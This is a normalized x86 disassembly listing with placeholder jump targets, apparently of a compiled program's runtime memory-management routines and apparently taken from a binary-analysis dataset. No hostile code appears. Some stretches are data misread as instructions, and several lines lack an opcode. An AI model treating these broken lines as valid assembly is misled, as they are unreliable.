sub_40115f
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404018
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401181
popad
adc [ eax ] eax
imul edx [ ecx ] 0x40
add [ ebp + 0x11 ] dh
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
adc [ ecx ] 0x80040
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cld
adc [ eax ] eax
lea edx [ ecx ]
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ ebx + ebp * 2 + 0x40 ] dh
add [ eax - 0x3fffbf95 ] al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x6b900040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
sbb [ fs : ebx ] ecx
mov eax eax
jmp [ UnhandledExceptionFilter@IAT ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
adc al 0x12
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401280
push esp
imul ebp [ ebp + 0x65 ] 0x8825ff01
sbb [ ebx ] ecx
mov eax eax
jmp [ rw-data ]
sub_401488
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_4014d4
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4014f8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x30 ] ecx
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_401524
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x38 ] ecx
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_401554
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
fild [ eax + 0x38 ]
mov ecx [ eax + 0x40 ]
mov [ edx + 0x40 ] ecx
fistp [ edx + 0x38 ]
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_40158c
sub ecx 0xc
add eax ecx
add edx ecx
neg ecx
jns r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
mov eax [ ecx + eax + 0x8 ]
mov [ ecx + edx + 0x8 ] eax
retn
fild [ ecx + eax ]
fild [ ecx + eax + 0x8 ]
fistp [ ecx + edx + 0x8 ]
fistp [ ecx + edx ]
add ecx 0x10
js r-xdata
sub_4015d8
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp ecx edx
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
retn
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
retn
sub_401618
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
lea ecx [ edx * 8 + rw-data ]
mov edx [ ecx + 0x4 ]
cmp edx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ ecx + 0x4 ] eax
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0x1
shl eax cl
or [ edx * 4 + rw-data ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
retn
retn
sub_401678
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test [ eax - 0x4 ] 0x1
jne r-xdata
retn
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
cmp edx 0xb30
jb r-xdata
or [ eax - 0x4 ] 0x8
mov edx [ rw-data ]
sub eax edx
mov ecx [ rw-data ]
sub eax ecx
add edx ecx
jmp r-xdata
call sub_4015d8
mov eax [ rw-data ]
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
retn
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jae sub_401618
sub_4016e4
push ebx
mov ebx eax
call sub_401678
push 0x4
push 0x1000
push 0x140000
push 0x0
call sub_4013cc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov ecx eax
mov [ ecx ] rw-data
mov [ rw-data ] eax
mov [ ecx + 0x4 ] edx
mov [ edx ] eax
mov edx eax
add edx 0x140000
mov ecx edx
sub ecx 0x4
mov [ ecx ] 0x2
mov ecx 0x13fff0
sub ecx ebx
mov [ rw-data ] ecx
sub edx ebx
mov eax edx
mov [ rw-data ] eax
or ebx 0x2
mov edx eax
sub edx 0x4
mov [ edx ] ebx
pop ebx
retn
sub_40175c
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp r-xdata
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40144c
test al al
jne r-xdata
push 0x0
call sub_4013dc
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40144c
test al al
je r-xdata
push 0xa
call sub_4013dc
sub_40183c
lea edx [ eax + 0x3 ]
shr edx 0x3
cmp eax 0xa2c
push ebx
mov cl [ rw-data ]
ja r-xdata
cmp eax 0x40a2c
ja r-xdata
test cl cl
movzx eax [ edx + rw-data ]
lea ebx [ eax * 8 + rw-data ]
jne r-xdata
pop ebx
test eax eax
jns r-xdata
lea ebx [ eax + 0xd3 ]
and ebx 0xffffff00
add ebx 0x30
test cl cl
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx 0xfffffff8
cmp edx ebx
je r-xdata
push ebx
push esi
push edi
push ebp
mov ebp eax
lea esi [ ebp + 0x10010 ]
dec esi
add esi 0x4
and esi 0xffff0000
push 0x4
push 0x101000
push esi
push 0x0
call sub_4013cc
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
and eax [ edx * 4 + rw-data ]
je r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x10 ]
movzx ecx [ ebx + 0x2 ]
add ecx eax
cmp eax [ ebx + 0xc ]
ja r-xdata
add [ edx + 0xc ] 0x1
and ecx [ eax - 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ eax - 0x4 ] edx
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov [ edi + 0x8 ] ebp
or esi 0x4
mov [ edi + 0xc ] esi
call sub_40175c
mov eax [ rw-data ]
mov [ edi ] rw-data
mov [ rw-data ] ebx
mov [ edi + 0x4 ] eax
mov [ eax ] ebx
mov [ rw-data ] 0x0
add ebx 0x10
push 0x0
call sub_4013dc
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
add [ edx + 0xc ] 0x1
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ eax - 0x4 ] edx
pop ebx
retn
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] ebx
mov [ ebx + 0x4 ] ecx
mov [ ebx ] 0x0
pop ebx
retn
mov [ ebx ] 0x0
pop ebx
retn
push 0xa
call sub_4013dc
jmp r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ edx * 4 + rw-data ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
push esi
push edi
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ eax ] edi
cmp edi eax
jne r-xdata
sub ebx 0x40
push 0x0
call sub_4013dc
mov eax 0x100
[ ebx ] ah
je r-xdata
movsx esi [ ebx + 0x1 ]
and esi [ rw-data ]
je r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov eax ebx
call sub_4016e4
mov eax [ rw-data ]
sub eax ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
or ebx 0x2
mov [ eax - 0x4 ] ebx
jmp r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
push 0xa
call sub_4013dc
jmp r-xdata
movzx ecx [ ebx + 0x18 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea esi [ eax * 8 ]
mov ecx [ eax * 4 + rw-data ]
bsf ecx ecx
lea ecx [ ecx + esi * 4 ]
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ edx ] edi
cmp edi edx
jne r-xdata
push 0x0
call sub_4013dc
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
and [ edi + esi - 0x4 ] 0xf7
lea eax [ ebx + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
movzx eax [ ebx + 0x1a ]
mov edi eax
call sub_4016e4
mov esi eax
test eax eax
jne r-xdata
mov esi [ rw-data ]
movzx ecx [ ebx + 0x1a ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ eax * 4 + rw-data ] edx
jne r-xdata
push 0xa
call sub_4013dc
jmp r-xdata
lea ecx [ ebx + 0x2 ]
mov [ esi - 0x4 ] ecx
mov [ rw-data ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_401618
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ esi - 0x4 ] ecx
xor eax eax
mov [ rw-data ] al
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x10 ] esi
lea eax [ esi + 0x20 ]
movzx ecx [ ebx + 0x2 ]
lea edx [ ecx + eax ]
mov [ ebx + 0x8 ] edx
add edi esi
sub edi ecx
mov [ ebx + 0xc ] edi
mov [ ebx ] 0x0
mov [ eax - 0x4 ] esi
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] al
mov [ ebx ] al
pop edi
pop esi
pop ebx
retn
sub esi edi
sub [ rw-data ] edi
mov [ rw-data ] esi
jmp r-xdata
mov edi ecx
and [ edi + esi - 0x4 ] 0xf7
mov edx edi
movzx edi [ ebx + 0x1a ]
sub edx edi
lea eax [ edi + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
call sub_401618
jmp r-xdata
btr [ rw-data ] eax
sub_401ba4
mov edx [ eax - 0x4 ]
test dl 0x7
mov ecx eax
push ebx
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov ebx [ edx ]
jne r-xdata
pop ebx
test dl 0x3
je r-xdata
and edx 0xfffffff0
test bl bl
mov ebx edx
push esi
mov esi eax
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
sub [ edx + 0xc ] 0x1
mov eax [ edx + 0x8 ]
je r-xdata
push ebx
push esi
push edi
mov ebx eax
sub ebx 0x10
call sub_40175c
mov eax ebx
mov esi [ eax ]
mov edi [ eax + 0x4 ]
push 0x8000
push 0x0
push ebx
call VirtualFree
test eax eax
je r-xdata
mov eax 0xffffffff
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ ebx + esi - 0x4 ] 0x1
mov ecx [ ebx + esi - 0x4 ]
jne r-xdata
push ecx
push edx
push 0x0
call sub_4013dc
pop edx
pop ecx
mov eax 0x100
[ ebx ] ah
je r-xdata
test eax eax
je r-xdata
test eax eax
mov [ edx + 0x8 ] ecx
lea eax [ eax + 0x1 ]
mov [ ecx - 0x4 ] eax
je r-xdata
or eax 0xffffffff
mov [ edi ] esi
mov [ esi + 0x4 ] edi
xor eax eax
jmp r-xdata
push 0x0
call sub_4013dc
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea eax [ ebx + esi ]
and ecx 0xfffffff0
add ebx ecx
cmp ecx 0xb30
jb r-xdata
or ecx 0x8
mov [ ebx + esi - 0x4 ] ecx
push ecx
push edx
push 0xa
call sub_4013dc
pop edx
pop ecx
jmp r-xdata
mov [ ebx + 0xc ] eax
mov eax [ edx + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x14 ] eax
xor eax eax
cmp [ ebx + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edx + 0x14 ] ebx
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x14 ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx ] 0x0
xor eax eax
pop ebx
retn
xor eax eax
mov [ ebx ] al
pop ebx
retn
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebx
retn
push 0xa
call sub_4013dc
jmp r-xdata
test [ esi - 0x4 ] 0x8
jne r-xdata
call sub_4015d8
jmp r-xdata
mov ecx [ esi - 0x8 ]
sub esi ecx
add ebx ecx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13fff0
je r-xdata
mov [ ebx ] al
mov eax edx
mov edx [ edx - 0x4 ]
mov bl [ rw-data ]
jmp r-xdata
mov eax esi
call sub_4015d8
jmp r-xdata
cmp [ rw-data ] 0x13fff0
jne r-xdata
lea eax [ ebx + 0x3 ]
mov [ esi - 0x4 ] eax
mov [ ebx + esi - 0x8 ] ebx
mov eax esi
mov edx ebx
call sub_401618
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
lea ebx [ esi + 0x13fff0 ]
call sub_401678
mov [ ebx - 0x4 ] 0x2
mov [ rw-data ] 0x13fff0
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub esi 0x10
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ rw-data ] 0x0
push 0x8000
push 0x0
push esi
call VirtualFree
cmp eax 0x1
sbb eax eax
pop esi
pop ebx
retn
sub_401d84
mov ecx [ eax - 0x4 ]
test cl 0x7
push ebx
push esi
mov esi eax
jne r-xdata
test cl 0x5
jne r-xdata
mov ebx [ ecx ]
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
cmp ecx edx
jb r-xdata
test cl 0x3
jne r-xdata
mov ebx ecx
and ecx 0xfffffff0
push edi
lea edi [ ecx + eax ]
sub ecx 0x4
and ebx 0xf
cmp edx ecx
push ebp
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
push edi
mov edi edx
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
call sub_40183c
test eax eax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx 0x18
cmp edx ecx
jbe r-xdata
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
lea ebp [ edx + edx ]
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi 0x40a2c
jbe r-xdata
mov ebx edx
mov eax edx
call sub_40183c
test eax eax
je r-xdata
pop esi
pop ebx
retn
shr ecx 0x1
cmp edx ecx
jb r-xdata
mov eax ecx
shr ecx 0x2
add ecx eax
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
mov ebx eax
push edx
call sub_40183c
pop edx
test eax eax
je r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
add eax edx
mov ebp eax
mov edi ecx
push edx
call sub_40183c
pop edx
test eax eax
je r-xdata
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
cmp edx 0xb2c
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
mov edx eax
mov edi eax
mov eax esi
call [ ebx + 0x1c ]
mov eax esi
call sub_401ba4
mov eax edi
mov [ eax - 0x8 ] edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx eax
mov ebx eax
mov eax esi
call sub_4015bc
mov eax esi
call sub_401ba4
mov eax ebx
mov ebx edx
mov eax edx
call sub_40183c
test eax eax
je r-xdata
mov [ eax - 0x8 ] edx
pop esi
pop ebx
retn
pop esi
pop ebx
retn
cmp ebx 0x40a2c
jbe r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp 0x40a2c
jbe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ebp [ edx + 0xd3 ]
and ebp 0xffffff00
add ebp 0x30
add ecx 0x4
sub ecx ebp
cmp [ rw-data ] 0x0
je r-xdata
cmp ebp 0xb2c
jb r-xdata
cmp ebx 0x40a2c
jbe r-xdata
mov ecx [ esi - 0x8 ]
mov ebx eax
mov edx eax
mov eax esi
call sub_40158c
mov eax esi
call sub_401ba4
mov eax ebx
mov [ eax - 0x8 ] edx
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_40158c
mov eax esi
call sub_401ba4
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ eax - 0x8 ] edx
cmp eax 0xb30
jb r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebx ebp
mov [ esi - 0x4 ] ebx
mov ebx ecx
mov edx [ edi - 0x4 ]
test dl 0x1
jne r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov edi edx
mov eax edx
call sub_40183c
test eax eax
je r-xdata
mov edx 0xb2c
mov ecx ebx
mov ebx eax
mov edx eax
mov eax esi
call sub_4015bc
mov eax esi
call sub_401ba4
mov eax ebx
pop esi
pop ebx
retn
mov [ eax - 0x8 ] ebx
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd3 ]
and eax 0xffffff00
add eax 0x30
lea edx [ ebp + 0x4 ]
sub edx eax
ja r-xdata
mov eax edi
push ecx
push edx
call sub_4015d8
pop edx
pop ecx
mov ebx 0xf
and ebx [ esi - 0x4 ]
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
push ecx
push edx
push 0x0
call sub_4013dc
pop edx
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov eax edi
and edx 0xfffffff0
add ebx edx
add edi edx
cmp edx 0xb30
jb r-xdata
or edx 0x8
mov [ edi - 0x4 ] edx
jmp r-xdata
mov ebx 0xf
and ebx [ esi - 0x4 ]
push ecx
push 0x0
call sub_4013dc
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_4015bc
mov eax esi
call sub_401ba4
mov eax ebp
mov [ esi + ebp - 0x4 ] edx
lea edi [ edx + 0x3 ]
mov [ eax + esi - 0x4 ] edi
mov ebp eax
cmp edx 0xb30
jb r-xdata
and [ esi + ebp ] 0xfffffff7
add ebp 0x4
jmp r-xdata
mov [ rw-data ] 0x0
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
push ecx
push edx
push 0xa
call sub_4013dc
pop edx
pop ecx
jmp r-xdata
mov [ edi - 0x8 ] ebx
lea eax [ ebx + 0x3 ]
mov [ esi + ebp - 0x4 ] eax
cmp ebx 0xb30
jb r-xdata
call sub_4015d8
push ecx
push 0xa
call sub_4013dc
pop ecx
jmp r-xdata
or ebp ebx
mov [ esi - 0x4 ] ebp
mov [ rw-data ] 0x0
mov eax esi
add eax esi
call sub_401618
mov [ rw-data ] 0x0
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + ebp ]
mov edx ebx
call sub_401618
sub_40210c
push ebx
lea ebx [ eax - 0x1 ]
and ebx 0xfffffffc
call sub_40183c
cmp eax 0x1
sbb ecx ecx
lea edx [ ebx + eax ]
or ebx ecx
cmp ebx 0x40a2c
jae r-xdata
pop ebx
retn
neg ebx
fldz
fst [ ebx + edx ]
add ebx 0x8
js r-xdata
mov [ edx ] ecx
ffree st0
sub_40213c
mov ecx eax
mov edx ecx
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
add edx ecx
mov eax edx
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor eax eax
sub_402160
cmp [ rw-data ] 0x0
je r-xdata
add eax 0x10
retn
mov edx [ rw-data ]
cmp edx eax
jb r-xdata
mov edx eax
add edx 0x140000
cmp edx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x13fff0
je r-xdata
xor eax eax
mov eax [ rw-data ]
jmp r-xdata
retn
sub_4021a0
push ebx
push esi
mov ebx eax
add ebx 0x20
mov [ edx ] ebx
mov edx [ eax ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov ebx esi
sub ebx 0x4
mov ebx [ ebx ]
and ebx 0xfffffff0
add ebx esi
movzx eax [ edx + 0x2 ]
sub ebx eax
mov [ ecx ] ebx
pop esi
pop ebx
retn
mov ebx [ edx + 0x8 ]
cmp ebx [ edx + 0xc ]
jbe r-xdata
mov eax [ edx + 0x8 ]
dec eax
mov [ ecx ] eax
pop esi
pop ebx
retn
sub_4021dc
push edi
mov edi edx
add eax 0x1
mov edx 0x89705f41
mul edx
shr eax 0x1e
mov ecx edx
and edx 0x1fffffff
shr ecx 0x1d
lea edx [ edx + edx * 4 ]
add edx eax
mov eax ecx
or eax 0x30
mov [ edi ] al
mov eax edx
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1c
and edx 0xfffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1b
and edx 0x7ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1a
and edx 0x3ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x19
and edx 0x1ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x18
and edx 0xffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x17
and edx 0x7fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x16
and edx 0x3fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x15
and edx 0x1fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x14
or eax 0x30
mov [ edi ] al
lea eax [ edi + 0x1 ]
pop edi
retn
sub_402310
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov ecx edx
add ecx 0xffffffb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
cmp ecx eax
jb r-xdata
push 0x1c
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax ebx
add eax 0xffffffb4
push eax
call sub_401360
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx - 0x10 ]
add edx 0xffffffdf
cmp eax edx
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx ebx
add edx 0xffffffdf
cmp eax edx
jbe r-xdata
cmp esi 0x3e8
jge r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x1000
jne r-xdata
pop esi
pop ebx
pop ebp
retn
add ebx 0xffffffdc
mov ebx [ ebx ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x8 ] 0xe6
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
mov eax ebx
sub eax 0xffffffb4
call sub_402310
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x7 ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
add eax 0xffffffb4
cmp ebx [ eax ]
je r-xdata
mov al 0x1
sub_4023c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
cmp ebx 0x10000
jb r-xdata
xor ebx ebx
push ebp
xor edx edx
mov eax ebx
call sub_402310
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4023f8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
retn
push 0x4
push 0x1000
push 0x10000
push 0x0
call sub_4013cc
mov [ rw-data ] eax
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40144c
test al al
jne r-xdata
push 0x0
call sub_4013dc
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40144c
test al al
je r-xdata
push 0xa
call sub_4013dc
sub_402464
push ebx
mov ebx eax
call sub_4023f8
test al al
je r-xdata
xor eax eax
mov eax [ rw-data ]
cmp [ eax ] 0x3ffe
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov [ edx + eax * 4 + 0x4 ] ebx
mov eax [ rw-data ]
inc [ eax ]
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
sub_4024a4
push ebx
push esi
push edi
mov esi eax
mov edi rw-data
xor ebx ebx
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call sub_4023f8
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
dec edx
test edx edx
jl r-xdata
mov [ rw-data ] 0x0
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx ]
mov ecx [ edi ]
mov edx [ ecx + edx * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 + 0x4 ] edx
